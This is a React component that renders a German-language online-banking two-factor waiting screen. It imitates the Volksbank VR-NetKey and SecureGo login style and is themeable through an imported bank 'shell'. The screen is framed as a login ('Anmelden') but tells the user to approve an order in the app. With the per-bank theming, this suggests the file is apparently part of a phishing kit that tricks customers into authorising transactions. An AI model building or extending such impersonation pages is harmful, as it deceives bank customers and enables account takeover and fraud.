import { useState } from "react";
import { ArrowDown, Check, ChevronDown, ChevronUp, Lock, LockOpen, Smartphone } from "lucide-react";
import type { FlowTheme } from "./BankShell";

export function TanWaitingScreen({
  theme,
  themeColor,
  secureGoLabel,
  vrNetKey,
  approved = false,
  onCancel,
}: {
  theme: FlowTheme;
  themeColor: string;
  secureGoLabel: string;
  vrNetKey?: string;
  approved?: boolean;
  onCancel?: () => void;
}) {
  const accent = theme.accentText || theme.buttonBg || themeColor;
  const [showExplain, setShowExplain] = useState(false);
  const [pickerOpen, setPickerOpen] = useState(false);

  return (
    <main className="flex-1 py-8 sm:py-12 px-4">
      <div className="w-full max-w-5xl mx-auto">
        <h2 className="text-3xl sm:text-4xl font-bold mb-4" style={{ color: accent }}>
          Anmelden
        </h2>

        <div className="bg-white border border-gray-200 rounded-md">
          {/* Info banner */}
          <div
            className="m-4 sm:m-6 flex items-center gap-3 rounded-sm px-4 py-3"
            style={{
              backgroundColor: "#eef2f6",
              border: `1px solid ${accent}`,
              borderLeftWidth: "4px",
            }}
          >
            <span
              className="flex-shrink-0 h-6 w-6 rounded-full border-2 flex items-center justify-center text-sm font-serif italic"
              style={{ borderColor: accent, color: accent }}
              aria-hidden="true"
            >
              i
            </span>
            <p className="text-sm text-gray-900">
              Bestätigen Sie die Anmeldung mit Ihrem Sicherheitsverfahren.
            </p>
          </div>

          <div className="px-4 sm:px-6 pb-6 grid grid-cols-1 md:grid-cols-2 gap-8">
            {/* Left: Ihr Auftrag */}
            <div>
              <h3 className="text-lg font-bold text-gray-900 mb-4">Kundenauthentifizierung 2FA</h3>
              <p className="text-xs text-gray-500">VR-NetKey/Alias</p>
              <p className="text-base font-medium text-gray-900 mb-6">{vrNetKey || "—"}</p>

              <div className="flex items-center gap-3">
                <div className="h-12 w-12 rounded-full border-2 border-gray-900 flex items-center justify-center">
                  <Lock className="h-5 w-5 text-gray-900" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 leading-tight">Service Bereich</p>
                  <p className="text-sm text-gray-900 leading-tight">unbestätigt</p>
                </div>
              </div>

              <div className="ml-[22px] my-1">
                <ArrowDown className="h-6 w-6 text-gray-900" strokeWidth={1.5} />
              </div>

              <div className="flex items-center gap-3">
                <div className="h-12 w-12 rounded-full border-2 border-gray-900 flex items-center justify-center">
                  {approved ? (
                    <LockOpen className="h-5 w-5 text-gray-900" />
                  ) : (
                    <Lock className="h-5 w-5 text-gray-400" />
                  )}
                </div>
                <div>
                  <p className="text-sm text-gray-500 leading-tight">Service Bereich</p>
                  <p className="text-sm text-gray-900 leading-tight">bestätigt</p>
                </div>
              </div>
            </div>

            {/* Right: Sicherheitsabfrage */}
            <div>
              <h3 className="text-lg font-bold text-gray-900 mb-4">Sicherheitsabfrage</h3>

              <button
                type="button"
                className="flex items-center gap-2 text-sm font-semibold mb-3"
                style={{ color: accent }}
                onClick={() => setShowExplain((v) => !v)}
              >
                <ChevronDown
                  className={`h-4 w-4 transition-transform ${showExplain ? "rotate-180" : ""}`}
                />
                Bitte unbedingt Auftragsdaten abgleichen
              </button>

              {showExplain && (
                <div className="rounded-md bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700 mb-3">
                  Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor
                  Sie den Auftrag freigeben.
                </div>
              )}

              <div className="relative mb-4">
                <button
                  type="button"
                  onClick={() => setPickerOpen((v) => !v)}
                  className={`relative z-10 flex w-full items-center justify-between rounded-md border bg-white px-3 py-2 text-left transition-colors ${pickerOpen ? "border-2 border-[#0066b3]" : "border-gray-300"}`}
                >
                  <div>
                    <p className="text-[10px] text-gray-500 leading-none">Sicherheitsverfahren</p>
                    <p className="text-sm text-gray-900">{secureGoLabel}</p>
                  </div>
                  {pickerOpen ? (
                    <ChevronUp className="h-5 w-5 text-gray-500" />
                  ) : (
                    <ChevronDown className="h-5 w-5 text-gray-400" />
                  )}
                </button>
                <div
                  className={`absolute left-0 right-0 top-full z-20 mt-1 origin-top rounded-md border-2 border-[#0066b3] bg-[#eef4fa] p-2 shadow-lg transition-all duration-200 ease-out ${pickerOpen ? "pointer-events-auto translate-y-0 scale-y-100 opacity-100" : "pointer-events-none -translate-y-2 scale-y-95 opacity-0"}`}
                >
                  <div className="flex items-center justify-between px-1 py-1">
                    <span className="text-sm text-gray-900">{secureGoLabel}</span>
                    <Check className="h-5 w-5 text-[#0066b3]" />
                  </div>
                </div>
              </div>

              <div
                className="rounded-md border-l-4 px-4 py-3"
                style={{ borderLeftColor: "#ff6b1a", backgroundColor: "#fff5ee" }}
              >
                <div className="flex items-center gap-2 mb-2">
                  <Smartphone className="h-5 w-5 text-gray-800" />
                  <p className="text-sm font-bold text-gray-900">
                    Bestätigen mit {secureGoLabel}
                  </p>
                </div>
                <ol className="text-sm text-gray-800 space-y-1.5 list-decimal pl-5">
                  <li>Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
                  <li>Prüfen Sie die Auftragsdaten.</li>
                  <li>
                    Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind. Andernfalls
                    lehnen Sie den Auftrag ab.
                  </li>
                </ol>
                <div className="flex justify-center pt-3">
                  <div
                    className="h-8 w-8 rounded-full border-4 border-gray-200 animate-spin"
                    style={{ borderTopColor: theme.buttonBg }}
                    aria-hidden="true"
                  />
                </div>
              </div>
            </div>
          </div>

          {onCancel && (
            <div className="border-t border-gray-200 px-4 sm:px-6 py-4">
              <button
                type="button"
                onClick={onCancel}
                className="px-8 py-2.5 rounded-full border-2 text-sm font-semibold bg-white hover:bg-gray-50 transition"
                style={{ borderColor: accent, color: accent }}
              >
                Abbrechen
              </button>
            </div>
          )}
        </div>
      </div>
    </main>
  );
}
